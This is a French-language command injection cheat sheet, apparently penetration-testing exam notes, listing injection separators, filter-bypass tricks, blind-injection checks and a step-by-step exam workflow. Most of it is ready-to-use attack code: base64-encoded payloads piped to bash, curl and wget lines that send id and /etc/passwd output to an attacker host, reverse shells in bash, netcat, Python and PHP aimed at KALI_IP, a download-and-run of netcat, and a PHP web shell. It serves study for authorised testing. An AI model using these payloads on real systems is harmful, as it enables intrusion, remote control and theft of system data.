# Command Injection

## 1. Détection

### 1.1 Contextes courants

L'injection de commande survient quand une entrée utilisateur est passée directement à une fonction système :

```php
# PHP
system("ping -c 5 " . $_GET['ip']);

# Python
os.system("ping " + request.args.get('ip'))
```

Chercher dans les paramètres qui ressemblent à des arguments systèmes :  
`ip`, `host`, `cmd`, `exec`, `path`, `file`, `dir`...

### 1.2 Payload de détection basique

```bash
# Séparateurs à tester un par un
127.0.0.1;id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&&id
127.0.0.1`id`
127.0.0.1$(id)
```

---

## 2. Séparateurs de commandes

| Séparateur  | Comportement                       | Exemple          |
|-------------|------------------------------------|------------------|
| `;`         | Exécute les deux quoi qu'il arrive | `cmd1;cmd2`      |
| `\|`        | Pipe stdout vers cmd2              | `cmd1\|cmd2`     |
| `&&`        | cmd2 si cmd1 réussit               | `cmd1&&cmd2`     |
| `\|\|`      | cmd2 si cmd1 échoue                | `cmd1\|\|cmd2`   |
| `` `cmd` `` | Substitution de commande           | `` echo `id` ``  |
| `$(cmd)`    | Substitution de commande           | `echo $(id)`     |
| `%0A`       | Newline URL-encodé                 | `cmd1%0Acmd2`    |
| `%0D%0A`    | CRLF URL-encodé                    | `cmd1%0D%0Acmd2` |

---

## 3. Bypass de filtres

### 3.1 Injection de null statement `$()`

Insère une substitution vide entre les caractères bloqués :

```bash
# Filtre bloque "id"
i$()d
wh$()oami

# Filtre bloque "nc"
n$()c -n$()lvp 9090

# Filtre bloque "cat"
c$()at /etc/passwd
```

### 3.2 Bypass si `;`, `|`, `&` sont tous bloqués

```bash
# Newline URL-encodé
127.0.0.1%0Awhoami

# CRLF
127.0.0.1%0D%0Awhoami

# Backtick
127.0.0.1`whoami`

# $() notation
127.0.0.1$(whoami)
```

### 3.3 Bypass via Base64

Quand les mots-clés sont bloqués, encoder le payload en base64 :

```bash
# Sur Kali : encoder la commande
echo "cat /etc/passwd" | base64
# → Y2F0IC9ldGMvcGFzc3dkCg==

# Payload injecté
;`echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | bash`

# Alternative openssl si base64 absent
echo "commande" | openssl base64 | openssl base64 -d | bash
```

### 3.4 Encapsulation bash -c

Protège les caractères spéciaux du parsing HTTP/shell intermédiaire :

```bash
# Sans encapsulation → & casse le payload
bash -c 'bash -i >& /dev/tcp/KALI/9090 0>&1'

# URL-encodé pour envoi via navigateur/curl
bash+-c+'bash+-i+>%26+/dev/tcp/KALI/9090+0>%261'
```

---

## 4. Blind Command Injection

Quand l'output n'est pas affiché dans la réponse.

### 4.1 Confirmer avec sleep

```bash
# Mesurer le temps de réponse
time curl "http://TARGET/page?ip=127.0.0.1;sleep%205"
# Si real ≈ 5s → injection aveugle confirmée ✅
```

### 4.2 Exfiltrer via fichier web

```bash
# Écrire le résultat dans le web root
127.0.0.1;id > /var/www/html/output.txt

# Accéder au fichier
http://TARGET/output.txt
```

```bash
# Trouver les flags puis les exfiltrer
127.0.0.1;find / -name '*flag*' 2>/dev/null > /var/www/html/out.txt
127.0.0.1;cat /opt/flag.txt > /var/www/html/out.txt
```

### 4.3 Exfiltrer via requête HTTP (OOB)

```bash
# Sur Kali : listener
python3 -m http.server 80

# Payload injecté
;curl http://KALI/?data=$(id | base64)
;wget http://KALI/?data=$(cat /etc/passwd | base64)
```

---

## 5. Énumération post-injection

Une fois l'exécution confirmée, vérifier les capacités disponibles :

```bash
# Identité
;whoami
;id

# Binaires disponibles
;which nc wget curl python python3 perl php

# Répertoires inscriptibles
;find / -type d -perm -777 2>/dev/null
# → /dev/shm, /var/tmp, /tmp

# OS et réseau
;uname -a
;hostname
;ip a
;cat /etc/passwd
```

---

## 6. Reverse Shells

### 6.1 Setup listener (Kali)

```bash
nc -nlvp 9090
```

### 6.2 Bash

```bash
bash -i >& /dev/tcp/KALI_IP/9090 0>&1

# URL-encodé
bash+-c+'bash+-i+>%26+/dev/tcp/KALI_IP/9090+0>%261'
```

### 6.3 Netcat

```bash
# Avec -e (si disponible)
nc -nv KALI_IP 9090 -e /bin/bash
/bin/nc -nv KALI_IP 9090 -e /bin/bash
```

### 6.4 Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_IP",9090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### 6.5 PHP

```bash
php -r "system(\"bash -c 'bash -i >& /dev/tcp/KALI_IP/9090 0>&1'\");"

# URL-encodé complet
php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI_IP%2F9090%200%3E%261%27%5C%22)%3B%22
```

### 6.6 Transfert de fichier (nc binary)

```bash
# Sur Kali : exposer nc
sudo cp /bin/nc /var/www/html/
sudo service apache2 start

# Payload injecté sur la cible
curl http://KALI_IP/nc -O /var/tmp/nc ; chmod 755 /var/tmp/nc ; /var/tmp/nc -nv KALI_IP 9090 -e /bin/bash
```

---

## 7. Web Shell

Si on peut écrire un fichier dans le web root :

```bash
# Écrire le web shell
;echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# Utiliser le web shell
http://TARGET/shell.php?cmd=whoami
http://TARGET/shell.php?cmd=id
```

---

## 8. URL Encoding — Référence rapide

| Caractère | Encodé       |
|-----------|--------------|
| espace    | `%20` ou `+` |
| `&`       | `%26`        |
| `>`       | `%3E`        |
| `<`       | `%3C`        |
| `"`       | `%22`        |
| `'`       | `%27`        |
| `;`       | `%3B`        |
| `\|`      | `%7C`        |
| `/`       | `%2F`        |
| `\`       | `%5C`        |
| newline   | `%0A`        |

---

## 9. Workflow exam

```
1. Identifier les paramètres suspects (ip, host, cmd, file...)
2. Tester ; | && || avec une commande simple (id, whoami)
3. Si réponse vide → tester blind avec sleep
4. Confirmer blind → exfiltrer via fichier web ou OOB
5. Énumérer les binaires disponibles (nc, curl, wget, python)
6. Lancer listener : nc -nlvp 9090
7. Envoyer le reverse shell adapté au langage
8. Upgrade TTY si nécessaire
```

!!! tip "Astuce exam"
    Si `;` est bloqué → tester `%0A` (newline)  
    Si `id` est bloqué → tenter `i$()d`  
    Si output invisible → `sleep 5` pour confirmer, puis exfil via fichier web

